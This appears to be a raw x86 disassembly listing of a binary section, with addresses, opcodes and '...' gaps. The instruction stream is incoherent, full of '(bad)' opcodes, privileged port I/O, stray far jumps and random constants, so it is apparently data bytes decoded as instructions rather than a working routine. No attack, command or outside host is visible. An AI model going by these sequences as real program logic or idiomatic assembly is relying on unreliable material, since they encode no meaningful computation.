  424df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424df4:	in     eax,dx
  424df5:	xchg   ah,bh
  424df7:	out    dx,eax
  424df8:	xchg   edx,eax
  424df9:	cwde   
  424dfa:	sar    dh,1
  424dfc:	fiadd  WORD PTR [edi-0x39]
  424dff:	push   ds
  424e00:	mov    ecx,0x1fe3f962
  424e05:	retf   0x23f8
  424e08:	not    DWORD PTR [edi+0x313255d0]
  424e0e:	mov    DWORD PTR ds:[eax],0x0
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e77
  424e81:	add    ecx,DWORD PTR ds:0x189b091
  424e87:	add    BYTE PTR [ecx+eax*1],al
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	daa    
  424e8d:	and    BYTE PTR [ecx],bh
  424e8f:	and    dl,BYTE PTR [ebp-0x55]
  424e92:	ja     0x424eea
  424e94:	add    bh,BYTE PTR [ecx+esi*2-0x76c91acd]
  424e9b:	adc    eax,0x4aa27793
  424ea0:	sub    BYTE PTR [ebx-0x67b0c541],0xf6
  424ea7:	inc    eax
  424ea8:	(bad)  
  424ea9:	aad    0xcf
  424eab:	lds    edx,FWORD PTR [edx+0x61]
  424eae:	or     eax,DWORD PTR [ebp+0x4b36cbfc]
  424eb4:	mov    dl,0xe2
  424eb6:	sbb    BYTE PTR [edi-0x7a244636],cl
  424ebc:	add    DWORD PTR [ecx+0x2fc5af28],esi
  424ec2:	shr    BYTE PTR [ebp-0x4d],cl
  424ec5:	mov    al,ds:0xe96b5ed4
  424eca:	stos   BYTE PTR es:[edi],al
  424ecb:	lds    ebx,FWORD PTR [edx+edx*2]
  424ece:	fst    QWORD PTR [ebx-0x4d]
  424ed1:	sub    ch,ch
  424ed3:	sahf   
  424ed4:	dec    edi
  424ed5:	jge    0x424ef9
  424ed7:	div    BYTE PTR [eax-0x7]
  424eda:	xchg   edi,eax
  424edb:	adc    eax,edx
  424edd:	dec    ecx
  424ede:	pop    ds
  424edf:	aad    0x47
  424ee1:	xchg   ecx,eax
  424ee2:	stc    
  424ee3:	xchg   esi,eax
  424ee4:	lods   al,BYTE PTR ds:[esi]
  424ee5:	sbb    ch,BYTE PTR [ecx+esi*4]
  424ee8:	xor    BYTE PTR [edx],0x2
  424eeb:	(bad)  
  424eec:	dec    esp
  424eed:	add    ch,BYTE PTR [esp+ebp*4-0xc]
  424ef1:	les    eax,FWORD PTR [edx+0x46]
  424ef4:	loop   0x424f2b
  424ef6:	push   edi
  424ef7:	sbb    cl,BYTE PTR cs:[edx-0x289c7357]
  424efe:	jno    0x424ec9
  424f00:	jmp    0xbeddbb43
  424f05:	pop    esi
  424f06:	jbe    0x424f3f
  424f08:	push   eax
  424f09:	jecxz  0x424eb9
  424f0b:	shl    BYTE PTR [esi],1
  424f0d:	jnp    0x424e92
  424f0f:	inc    edi
  424f10:	mov    ah,0x6
  424f12:	jne    0x424f0d
  424f14:	push   edx
  424f15:	fsub   QWORD PTR [eax-0x3b9ad422]
  424f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f1c:	pop    edi
  424f1d:	mov    dh,0xc2
  424f1f:	and    ah,BYTE PTR ds:[ebx+0x6b4cb430]
  424f26:	push   esi
  424f27:	lock fild WORD PTR [ebx]
  424f2a:	mov    bl,0x89
  424f2c:	repnz cmp esp,ebx
  424f2f:	ds ret 0x3d02
  424f33:	lock les ecx,FWORD PTR [ebp-0x21216b68]
  424f3a:	push   cs
  424f3b:	jp     0x424f28
  424f3d:	sub    BYTE PTR [eax],0xda
  424f40:	jns    0x424f03
  424f42:	int    0x52
  424f44:	aaa    
  424f45:	(bad)  
  424f46:	addr16 push ebx
  424f48:	(bad)  
  424f49:	fdivp  st(7),st
  424f4b:	mov    ebp,0x31c00865
  424f50:	popf   
  424f51:	jg     0x424f71
  424f53:	aad    0xee
  424f55:	scas   eax,DWORD PTR es:[edi]
  424f56:	lods   al,BYTE PTR ds:[esi]
  424f57:	ins    BYTE PTR es:[edi],dx
  424f58:	jl     0x424fca
  424f5a:	sub    al,0x3d
  424f5c:	dec    esi
  424f5d:	add    al,0x98
  424f5f:	jp     0x424f04
  424f61:	(bad)  
  424f62:	cmc    
  424f63:	repz mov esp,0x3d06e3bd
  424f69:	sbb    bl,BYTE PTR [edi-0x702cc3b0]
  424f6f:	ror    DWORD PTR [ebp*1-0x5bd8ca59],cl
  424f76:	cmp    cl,bh
  424f78:	sbb    edi,0x2d
  424f7b:	xchg   DWORD PTR [esi-0x43a243f1],esp
  424f81:	sub    DWORD PTR [ecx-0x6439a6ca],ebx
  424f87:	cmp    ecx,ebx
  424f89:	subps  xmm1,XMMWORD PTR [ebx-0x73e55769]
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	xchg   ecx,eax
  425001:	mov    al,BYTE PTR [edx]
  425003:	inc    ecx
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	sbb    DWORD PTR [ebp-0x61],0xffffffaf
  425010:	adc    eax,esp
  425012:	jnp    0x424fa8
  425014:	jbe    0x425063
  425016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425017:	mov    ebx,0x9e386903
  42501c:	(bad)  
  42501d:	outs   dx,BYTE PTR ds:[esi]
  42501e:	mov    al,0x6d
  425020:	fs mov ch,0x8f
  425023:	jmp    0x425008
  425025:	ins    DWORD PTR es:[edi],dx
  425026:	sbb    BYTE PTR [esi-0x17cd80a8],0x0
  42502d:	sbb    al,0x74
  42502f:	push   0xffffff82
  425031:	pop    ebp
  425032:	dec    esi
  425033:	mov    ecx,0x38456fa1
  425038:	loopne 0x425066
  42503a:	cmp    esp,DWORD PTR [edx+0x11246280]
  425040:	lods   al,BYTE PTR ds:[esi]
  425041:	(bad)  
  425042:	enter  0x1657,0xcb
  425046:	cmp    bh,BYTE PTR [esi]
  425048:	adc    esp,DWORD PTR [ebp+0x3e]
  42504b:	push   cs
  42504c:	rol    ebp,cl
  42504e:	and    BYTE PTR [edx-0x428655f5],bh
  425054:	xor    eax,DWORD PTR [esi+0x122aa02b]
  42505a:	mov    ds:0xa2af9e7b,eax
  42505f:	loope  0x42506a
  425061:	add    eax,0x1d773460
  425066:	fcomp  QWORD PTR [eax]
  425068:	pop    edi
  425069:	out    dx,eax
  42506a:	ins    DWORD PTR es:[edi],dx
  42506b:	out    dx,al
  42506c:	sbb    ebp,edi
  42506e:	sub    eax,DWORD PTR [esp+ebp*4]
  425071:	or     al,cl
  425073:	ret    
  425074:	shl    edi,0xf1
  425077:	inc    ebx
  425078:	shl    bl,0x7d
  42507b:	test   eax,0xd36f1703
  425080:	ja     0x425024
  425082:	lods   al,BYTE PTR ds:[esi]
  425083:	jmp    0x425080
  425085:	rcl    DWORD PTR [eax+0x3d5a2ad8],cl
  42508b:	ds and eax,0xe6fbab76
  425091:	shl    BYTE PTR [esi-0x6e72406d],cl
  425097:	or     dh,BYTE PTR [eax+0x59]
  42509a:	xor    ah,BYTE PTR [esi-0x64986e1]
  4250a0:	xchg   esi,eax
  4250a1:	sub    esp,eax
  4250a3:	js     0x4250db
  4250a5:	jl     0x4250d3
  4250a7:	add    DWORD PTR [edx-0x7f],eax
  4250aa:	xchg   ch,cl
  4250ac:	push   0xffffff9e
  4250ae:	sbb    ah,BYTE PTR [ebx+0x60]
  4250b1:	call   0xf11e9b49
  4250b6:	ret    0xb210
  4250b9:	sbb    eax,0xb00e0758
  4250be:	pop    ebp
  4250bf:	jge    0x4250b3
  4250c1:	pop    es
  4250c2:	imul   ecx,DWORD PTR [edx],0xc
  4250c5:	push   ebx
  4250c6:	and    DWORD PTR [ecx+0xd],eax
  4250c9:	cmp    ch,BYTE PTR [edi+0x6f]
  4250cc:	in     al,0xb1
  4250ce:	pop    edi
  4250cf:	push   ecx
  4250d0:	inc    eax
  4250d1:	push   0x3a
  4250d3:	retf   0x27e1
  4250d6:	cmp    eax,0xed7702f1
  4250db:	shl    bh,cl
  4250dd:	xor    al,0x70
  4250df:	jmp    0x1bdc6865
  4250e4:	scas   al,BYTE PTR es:[edi]
  4250e5:	mov    bl,0x87
  4250e7:	add    ah,BYTE PTR [ebp-0x16]
  4250ea:	(bad)  
  4250eb:	jmp    0x888067e8
  4250f0:	push   edi
  4250f1:	dec    di
  4250f3:	retf   0xf033
  4250f6:	inc    ebp
  4250f7:	push   esi
  4250f8:	and    ch,al
  4250fa:	and    ebx,DWORD PTR [ebx+0x62bbf243]
  425100:	mov    esp,0xb912600c
  425105:	adc    BYTE PTR [eax+0x3276ab36],ah
  42510b:	add    dh,BYTE PTR [ebp+0x17]
  42510e:	mov    cl,BYTE PTR [eax+eax*1+0x0]
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xa9e2:0x300392e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [eax],bl
  42518d:	dec    esi
  42518e:	inc    ecx
  42518f:	pushf  
  425190:	aam    0x82
  425192:	jmp    0x42513d
  425194:	mov    edi,DWORD PTR [edx+0xb]
  425197:	out    dx,eax
  425198:	ror    DWORD PTR [ecx-0x76],cl
  42519b:	pop    ds
  42519c:	and    ah,BYTE PTR [edi+eiz*4]
  42519f:	mov    bh,0xc7
  4251a1:	pop    ds
  4251a2:	in     eax,dx
  4251a3:	scas   al,BYTE PTR es:[edi]
  4251a4:	pop    es
  4251a5:	dec    esi
  4251a6:	add    bl,BYTE PTR [esi]
  4251a8:	dec    ecx
  4251a9:	test   al,0xa2
  4251ab:	push   0xffffffef
  4251ad:	fnstsw WORD PTR [ebp-0x51daa5eb]
  4251b3:	nop
  4251b4:	jb     0x425172
  4251b6:	dec    esp
  4251b7:	inc    edi
  4251b8:	popf   
  4251b9:	mov    ah,0x49
  4251bb:	inc    eax
  4251bc:	dec    esp
  4251bd:	lds    esp,FWORD PTR [edx]
  4251bf:	pop    edi
  4251c0:	adc    al,BYTE PTR [edx+0x37f0c4f2]
  4251c6:	add    BYTE PTR [edx+0x5f],dh
  4251c9:	xor    al,0xd3
  4251cb:	retf   
  4251cc:	enter  0xe5c8,0x13
  4251d0:	repz cmp DWORD PTR ds:[edx-0x5c4143e0],ecx
  4251d8:	sbb    al,0xc
  4251da:	pusha  
  4251db:	fcmovnb st,st(1)
  4251dd:	xor    eax,0x29485814
  4251e2:	push   0xa4aae717
  4251e7:	pop    ebx
  4251e8:	push   edi
  4251e9:	sbb    al,0xb3
  4251eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251ec:	pop    eax
  4251ed:	mul    BYTE PTR [esi]
  4251ef:	fdivr  DWORD PTR [bp+si]
  4251f2:	sbb    edi,DWORD PTR [edi-0x62f4061]
  4251f8:	mov    dh,0xcf
  4251fa:	mov    ebp,0x46a5f641
  4251ff:	mov    cl,0x48
  425201:	test   BYTE PTR [ebx+0x13afab86],dl
  425207:	inc    edx
  425208:	adc    bh,bl
  42520a:	mov    esp,DWORD PTR [eax-0x432a9061]
  425210:	fs in  eax,0x1b
  425213:	mov    ds:0x30ffbb29,al
  425218:	jmp    0x42519e
  42521a:	inc    esp
  42521b:	call   0x5ff57422
  425220:	ret    0x1484
  425223:	xchg   ebx,eax
  425224:	push   ds
  425225:	and    eax,0x72a6c85a
  42522a:	mov    al,0xa5
  42522c:	mov    eax,ds:0xc3fee4b
  425231:	cwde   
  425232:	stos   DWORD PTR es:[edi],eax
  425233:	test   al,0x90
  425235:	xlat   BYTE PTR ds:[ebx]
  425236:	into   
  425237:	mov    eax,0x7ffcc5d1
  42523c:	sub    al,bl
  42523e:	popa   
  42523f:	and    eax,0xb94c665e
  425244:	in     eax,dx
  425245:	in     eax,0xd3
  425247:	and    al,BYTE PTR [ebx+0x2752bcc7]
  42524d:	mov    edx,DWORD PTR [ebp-0x7f]
  425250:	outs   dx,DWORD PTR ds:[esi]
  425251:	outs   dx,DWORD PTR ds:[esi]
  425252:	and    al,0x23
  425254:	sbb    eax,0x500c0742
  425259:	push   ebx
  42525a:	shl    DWORD PTR [ebp+0x6ec41f9a],1
  425260:	add    bl,BYTE PTR ds:0xd7055121
  425266:	fwait
  425267:	cmp    DWORD PTR ds:0x7b48a205,0xa
  42526e:	and    BYTE PTR [eax],ch
  425270:	fstp   TBYTE PTR [ecx-0x5a899871]
  425276:	fwait
  425277:	adc    DWORD PTR [ecx+edi*8],ebx
  42527a:	adc    eax,DWORD PTR [eax]
  42527c:	iret   
  42527d:	inc    ebx
  42527e:	add    BYTE PTR [eax],ah
  425280:	xchg   edx,eax
  425281:	stc    
  425282:	jmp    0x864c741
  425287:	mov    ebp,0x2b67e664
  42528c:	ror    edi,1
  42528e:	pop    eax
  42528f:	in     eax,dx
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	pop    ss
  425301:	cmp    DWORD PTR [ecx+0x18cbc58],edx
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	inc    esp
  42530d:	mov    al,ds:0x92662516
  425312:	cmp    BYTE PTR [edi],al
  425314:	pop    esi
  425315:	jnp    0x425314
  425317:	rcl    DWORD PTR [esi],0x83
  42531a:	xchg   esp,eax
  42531b:	and    eax,0x7fbe197d
  425320:	push   DWORD PTR [esi+0x31007661]
  425326:	into   
  425327:	das    
  425328:	ss and dl,dh
  42532b:	mov    cl,dl
  42532d:	pushf  
  42532e:	(bad)  
  42532f:	mov    dl,0xaa
  425331:	adc    ebx,esi
  425333:	mov    ebx,0xe386e7fa
  425338:	jmp    0x425396
  42533a:	outs   dx,DWORD PTR ds:[esi]
  42533b:	sbb    eax,0x6777e8b8
  425340:	mov    ebx,0xfeea633
  425345:	mov    BYTE PTR [ecx-0x39b6ac40],cl
  42534b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42534c:	sub    BYTE PTR [ebp+0x4f],0x67
  425350:	lea    ecx,[ebp+0xab2caf9]
  425356:	pop    esp
  425357:	imul   edx,DWORD PTR [ecx],0xae6945a7
  42535d:	repz loop 0x425301
  425360:	cs jmp 0x19b2:0xfd233305
  425368:	pop    esp
  425369:	sti    
  42536a:	les    esi,FWORD PTR [eax+0x4897288]
  425370:	es ins DWORD PTR es:[edi],dx
  425372:	rol    BYTE PTR [eax-0x59db405d],0xaa
  425379:	mov    WORD PTR es:[edx-0x22118e99],fs
  425380:	out    0xa8,al
  425382:	xchg   edx,eax
  425383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425384:	repz fld DWORD PTR [esi-0x1e]
  425388:	dec    edi
  425389:	pop    eax
  42538a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42538b:	mov    esi,0x5239cea9
  425390:	sbb    bl,dh
  425392:	push   ebx
  425393:	sti    
  425394:	cmp    DWORD PTR gs:[esi-0x33],esi
  425398:	loop   0x4253ae
  42539a:	aam    0xf7
  42539c:	inc    esi
  42539d:	add    esi,DWORD PTR [eax]
  42539f:	jae    0x4253ca
  4253a1:	imul   ecx,DWORD PTR [edx+0x4],0x11eceade
  4253a8:	fisub  WORD PTR ds:0xe1413642
  4253ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253af:	xor    eax,0xb6222ed9
  4253b4:	and    DWORD PTR cs:[ebx+0x63],edx
  4253b8:	pop    ecx
  4253b9:	imul   esi,DWORD PTR [ecx],0xf0ab9b4c
  4253bf:	sbb    esi,eax
  4253c1:	pop    esi
  4253c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253c3:	pop    esp
  4253c4:	les    ebp,FWORD PTR fs:[ecx]
  4253c7:	pop    ecx
  4253c8:	mov    al,ds:0x29325a23
  4253cd:	pop    esp
  4253ce:	xor    eax,0xff59b0e2
  4253d3:	mov    al,0x57
  4253d5:	jmp    0xaea2:0x697e0583
  4253dc:	or     al,cl
  4253de:	aam    0x87
  4253e0:	daa    
  4253e1:	adc    bl,BYTE PTR [ebx+0xf]
  4253e4:	jne    0x425427
  4253e6:	stos   BYTE PTR es:[edi],al
  4253e7:	fisubr DWORD PTR [esp+esi*1+0x5bb0e47]
  4253ee:	lods   al,BYTE PTR ds:[esi]
  4253ef:	fst    QWORD PTR [ebx]
  4253f1:	inc    ebp
  4253f2:	push   0x3c
  4253f4:	dec    ebp
  4253f5:	adc    eax,0x5e01c181
  4253fa:	es sti 
  4253fc:	sub    cl,bl
  4253fe:	div    BYTE PTR [ebx+0x34]
  425401:	jmp    0x4253ea
  425403:	dec    edi
  425404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425405:	into   
  425406:	neg    BYTE PTR [ebx+ebx*4+0x15]
  42540a:	outs   dx,BYTE PTR ds:[esi]
  42540b:	retf   
  42540c:	(bad)  
  42540d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42540e:	hlt    
  42540f:	inc    esp
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,DWORD PTR [ebp+0x6d]
  425482:	mov    bl,0x5d
  425484:	ror    BYTE PTR [ebp+0x1040001],0x0
  42548b:	add    BYTE PTR [edi],cl
  42548d:	jge    0x4254ad
  42548f:	or     eax,0x2b45a4f1
  425494:	lock pop ebx
  425496:	jmp    FWORD PTR [ebx+0x4e2b1d4d]
  42549c:	mov    ah,0x40
  42549e:	scas   eax,DWORD PTR es:[edi]
  42549f:	(bad)  [ecx-0x71]
  4254a2:	rol    BYTE PTR [edi+0x29803146],0x6b
  4254a9:	sbb    ebp,DWORD PTR [ecx+edi*1+0x262d0e2c]
  4254b0:	test   BYTE PTR [esi],dh
  4254b2:	out    dx,al
  4254b3:	shl    DWORD PTR [ecx],cl
  4254b5:	jne    0x425486
  4254b7:	adc    DWORD PTR [edx],eax
  4254b9:	jecxz  0x425484
  4254bb:	test   al,0xeb
  4254bd:	pop    eax
  4254be:	sub    BYTE PTR [eax+0xb26f664],cl
  4254c4:	push   esi
  4254c5:	loop   0x425527
  4254c7:	push   0xffffff9f
  4254c9:	pop    ss
  4254ca:	mov    bh,0xe8
  4254cc:	outs   dx,BYTE PTR ds:[esi]
  4254cd:	sub    DWORD PTR [edx],ebp
  4254cf:	imul   edx,edi,0xc126569b
  4254d5:	(bad)  
  4254d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254d8:	push   cs
  4254d9:	daa    
  4254da:	xor    bl,BYTE PTR [edx+0x677279c3]
  4254e0:	push   0xe5dd9486
  4254e5:	inc    ebp
  4254e6:	mov    esp,0x69798deb
  4254eb:	pop    edi
  4254ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ed:	outs   dx,BYTE PTR ds:[esi]
  4254ee:	push   ds
  4254ef:	pop    esi
  4254f0:	stos   DWORD PTR es:[edi],eax
  4254f1:	push   ds
  4254f2:	int    0xba
  4254f4:	and    dl,cl
  4254f6:	mov    ebx,0x3a24a01
  4254fb:	loop   0x425485
  4254fd:	mov    WORD PTR [edx+0x3ba0e500],fs
  425503:	cmp    esi,DWORD PTR [edi+0x7e6e92be]
  425509:	xor    ebp,edx
  42550b:	pop    ebp
  42550c:	imul   ebx,DWORD PTR ds:0x4a46abd1,0xffffffae
  425513:	arpl   cx,sp
  425515:	or     eax,0x202708bb
  42551a:	ror    DWORD PTR [edx-0x24],cl
  42551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42551e:	mov    bl,0xcb
  425520:	xchg   DWORD PTR [edx+0x144d44e3],ebx
  425526:	push   eax
  425527:	ss jns 0x4254ac
  42552a:	pop    esp
  42552b:	cmp    dl,cl
  42552d:	ins    DWORD PTR es:[edi],dx
  42552e:	adc    BYTE PTR [edx-0x327aeb6e],0x3d
  425535:	ins    BYTE PTR es:[edi],dx
  425536:	(bad)  
  425537:	out    dx,al
  425538:	cmp    DWORD PTR [ecx+ecx*1],edi
  42553b:	cmp    al,0x40
  42553d:	addr16 mov cl,0x97
  425540:	addr16 nop
  425542:	jmp    0xec7f:0x913663d1
  425549:	push   es
  42554a:	mov    ecx,0xa1486047
  42554f:	and    al,0x2d
  425551:	mov    BYTE PTR [esp-0xcaccf6a],bl
  425558:	push   es
  425559:	sar    ebx,0x5c
  42555c:	mov    bh,0xa1
  42555e:	mov    dh,0x25
  425560:	inc    edi
  425561:	nop
  425562:	sub    al,0x4a
  425564:	jmp    0xdc11e2dc
  425569:	mov    esp,0xe7c00fd2
  42556e:	fnstsw WORD PTR ds:0xaa719796
  425574:	and    al,0x4f
  425576:	cmp    bl,ah
  425578:	fild   DWORD PTR [ecx]
  42557a:	aam    0x90
  42557c:	call   0xd999:0xbf254911
  425583:	ja     0x425571
  425585:	mov    cl,0x51
  425587:	jbe    0x42550c
  425589:	and    ebx,edx
  42558b:	in     al,dx
  42558c:	ins    DWORD PTR es:[edi],dx
  42558d:	mov    ds:0x6200,al
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xa6bbf13a
  425602:	add    ecx,DWORD PTR [ecx+0x18ec4]
  425608:	add    al,0x1
  42560a:	add    BYTE PTR [eax],al
  42560c:	adc    edx,esp
  42560e:	mov    ds:0x84ae6b1,eax
  425613:	aaa    
  425614:	or     bl,BYTE PTR [edi]
  425616:	rcr    BYTE PTR [ecx],cl
  425618:	fmul   DWORD PTR [ebx+eax*1+0x56055131]
  42561f:	in     eax,dx
  425620:	les    ebx,FWORD PTR [ecx-0x66f9292a]
  425626:	aas    
  425627:	in     al,dx
  425628:	mov    ecx,0xcf14a214
  42562d:	adc    ebp,esp
  42562f:	sub    esp,DWORD PTR [ebx+0x80e7091]
  425635:	jmp    0x2e9e:0xdb63225
  42563c:	adc    eax,0x576f4064
  425641:	pushf  
  425642:	pop    eax
  425643:	xchg   ecx,eax
  425644:	loopne 0x4256b9
  425646:	cli    
  425647:	arpl   WORD PTR [ecx+ebx*1-0x65],di
  42564b:	dec    ebp
  42564c:	mov    edi,0x7b036f63
  425651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425652:	inc    edx
  425653:	mov    dl,BYTE PTR [eax+0x4e36c735]
  425659:	pop    esp
  42565a:	test   BYTE PTR [ecx],ah
  42565c:	sbb    eax,0x8f818c76
  425661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425662:	js     0x4256b9
  425664:	shl    DWORD PTR [eax-0x7da41d18],0xc3
  42566b:	lds    ebp,FWORD PTR [eax]
  42566d:	push   ss
  42566e:	mov    ebp,es
  425670:	es push eax
  425672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425673:	imul   ebx,DWORD PTR ds:0x1461762f,0x89f703ec
  42567d:	mov    bh,0x69
  42567f:	inc    ecx
  425680:	arpl   WORD PTR [ebp+0x37319318],cx
  425686:	lods   eax,DWORD PTR ds:[esi]
  425687:	inc    edx
  425688:	dec    ebx
  425689:	xor    ecx,esi
  42568b:	sbb    edi,DWORD PTR [edx+eax*4-0x679edfa2]
  425692:	add    al,BYTE PTR [ebx-0x36]
  425695:	xor    BYTE PTR [ebx-0x13],0x4a
  425699:	fwait
  42569a:	test   al,0x79
  42569c:	xchg   edx,eax
  42569d:	fs repz je 0x425653
  4256a1:	mov    al,al
  4256a3:	ror    DWORD PTR [ebx],1
  4256a5:	iretw  
  4256a7:	(bad)  
  4256a9:	(bad)  
  4256aa:	xchg   edx,eax
  4256ab:	cdq    
  4256ac:	mov    eax,0xea5318b6
  4256b1:	dec    ebp
  4256b2:	adc    ebp,DWORD PTR [esi]
  4256b4:	loopne 0x4256ac
  4256b6:	out    dx,al
  4256b7:	out    0x49,eax
  4256b9:	or     ebp,DWORD PTR [esi+ebx*4-0x54722635]
  4256c0:	sar    bl,0x5f
  4256c3:	js     0x425695
  4256c5:	mov    al,0x38
  4256c7:	rcr    ebx,1
  4256c9:	xchg   esp,eax
  4256ca:	sbb    dh,dh
  4256cc:	retf   0x3e52
  4256cf:	pop    es
  4256d0:	add    ebp,DWORD PTR [ebp+0x53abf809]
  4256d6:	pushf  
  4256d7:	int    0x6d
  4256d9:	test   eax,0xa84d3801
  4256de:	pop    eax
  4256df:	or     BYTE PTR gs:[eax+0x7821e6c8],dh
  4256e6:	sbb    bh,bh
  4256e8:	adc    ebp,DWORD PTR [ecx]
  4256ea:	xlat   BYTE PTR ds:[ebx]
  4256eb:	loop   0x4256d3
  4256ed:	sbb    BYTE PTR [esi+eiz*1-0x7c],cl
  4256f1:	mov    ebp,0xb807db6d
  4256f6:	int    0xa9
  4256f8:	js     0x4256f4
  4256fa:	test   BYTE PTR [ecx-0x7c],0x5c
  4256fe:	mov    dh,0xb0
  425700:	inc    ecx
  425701:	(bad)  
  425702:	fadd   QWORD PTR [ecx-0x6d480e1b]
  425708:	mov    dl,0x16
  42570a:	in     al,0xdb
  42570c:	and    al,0x4d
  42570e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42570f:	jb     0x425711
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xc08c6f74
  425783:	pop    es
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	fmul   QWORD PTR [ebx+0x7a3882b9]
  425792:	dec    ebx
  425793:	add    ecx,eax
  425795:	cmp    al,0x73
  425797:	push   ebp
  425798:	sub    al,0xf
  42579a:	jns    0x4257f7
  42579c:	in     al,0x39
  42579e:	xor    eax,0x4b031a27
  4257a3:	and    eax,0xe6e30234
  4257a8:	inc    ebx
  4257a9:	jno    0x42581c
  4257ab:	(bad)  
  4257ac:	dec    ebx
  4257ad:	and    eax,0x9e0ab9d4
  4257b2:	fwait
  4257b3:	jecxz  0x425824
  4257b5:	or     al,0xfe
  4257b7:	call   DWORD PTR [ecx]
  4257b9:	iret   
  4257ba:	xchg   edx,eax
  4257bb:	jno    0x42574f
  4257bd:	dec    eax
  4257be:	inc    ecx
  4257bf:	push   0x5ede3ce9
  4257c4:	and    eax,0x3d92069d
  4257c9:	std    
  4257ca:	cmp    eax,0xf71ac514
  4257cf:	or     esp,DWORD PTR [ebx-0x3]
  4257d2:	jns    0x42578a
  4257d4:	stos   BYTE PTR es:[edi],al
  4257d5:	sub    DWORD PTR [edx-0x80],edx
  4257d8:	fdivr  st(6),st
  4257da:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257dc:	pop    ss
  4257dd:	jg     0x425840
  4257df:	aas    
  4257e0:	retf   0x610c
  4257e3:	data16 mov ds:0x4d5b8f46,al
  4257e9:	xchg   BYTE PTR ss:[eax-0x48b4e497],bh
  4257f0:	xor    al,0x86
  4257f2:	test   al,0x68
  4257f4:	and    BYTE PTR [esp+eax*4],0x0
  4257f8:	test   DWORD PTR ds:0xd105a458,esp
  4257fe:	inc    edx
  4257ff:	test   DWORD PTR [esi-0x19],0x468526fa
  425806:	cmp    DWORD PTR [esi],ecx
  425808:	aaa    
  425809:	imul   esi,edx,0x560411f5
  42580f:	mov    ds:0xf786c16a,eax
  425814:	mov    esp,0x3c1b815f
  425819:	out    0x6d,eax
  42581b:	sbb    DWORD PTR [esi+0x60cc6d6e],esp
  425821:	(bad)  
  425822:	js     0x42586a
  425824:	pop    edx
  425825:	and    dh,BYTE PTR [ecx]
  425827:	sahf   
  425828:	mov    es,WORD PTR [eax+0x70471cc4]
  42582e:	es cs loop 0x425847
  425832:	mov    ds:0xfbe909d6,al
  425837:	enter  0x1193,0xe
  42583b:	shl    bh,0x18
  42583e:	out    0xbc,eax
  425840:	dec    ebp
  425841:	fistp  QWORD PTR [ecx+esi*1+0x49]
  425845:	xchg   DWORD PTR [ebx],ecx
  425847:	sub    eax,0xc01b4287
  42584c:	fld    TBYTE PTR [esi]
  42584e:	inc    ebp
  42584f:	out    dx,al
  425850:	mov    DWORD PTR [ebx+0x20],ebp
  425853:	sub    ch,BYTE PTR [ebp-0x57]
  425856:	push   es
  425857:	aas    
  425858:	dec    ebp
  425859:	inc    eax
  42585a:	xchg   esp,eax
  42585b:	or     bh,0x4
  42585e:	sbb    cl,0x35
  425861:	hlt    
  425862:	mov    al,0xc
  425864:	out    0x1e,eax
  425866:	lods   al,BYTE PTR ds:[esi]
  425867:	nop
  425868:	or     eax,DWORD PTR [edi-0x2c]
  42586b:	xor    eax,0x69ee5937
  425870:	add    al,0xbb
  425872:	push   0x4b763e22
  425877:	fwait
  425878:	sub    DWORD PTR [edi+0x38201293],ebp
  42587e:	ins    BYTE PTR es:[edi],dx
  42587f:	dec    edi
